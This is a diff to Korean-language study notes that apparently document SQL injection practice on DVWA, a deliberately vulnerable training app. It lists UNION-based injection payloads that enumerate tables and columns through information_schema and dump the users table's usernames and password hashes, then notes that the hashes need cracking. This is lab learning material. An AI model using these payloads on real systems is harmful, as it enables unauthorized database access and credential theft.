@@ -252,3 +252,9 @@
 	- table_name에는 DB에 사용되는 table들의 이름들이 모두 저장되도록 sql에서 기본 설정되어 있기 때문에 사용자가 임의의 작업을 하지 않았다면 테이블 이름들을 확인 할 수 있다.
 - `5' union select 1,table_name from information_schema.tables where table_schema='dvwa'#` > dvwa DB의 테이블만 가져오는 구문![[Pasted image 20241008113053.png]]
 - `5' union select 1, column_name from information_schema.columns where table_name='users'#`![[Pasted image 20241008113428.png]]
+- user / password 칼럼의 정보를 열람하면 로그인 또한 가능할 것 같다.
+- `5' union select user, password from dvwa.users#`![[Pasted image 20241008114000.png]]패스워드가 암호화 되어 있어 크랙 툴이 필요하다
+- 일괄 hashing 코드 작성
+![[Pasted image 20241008114438.png]]
+- 암호화 정보 확인![[Pasted image 20241008114729.png]]
+- 
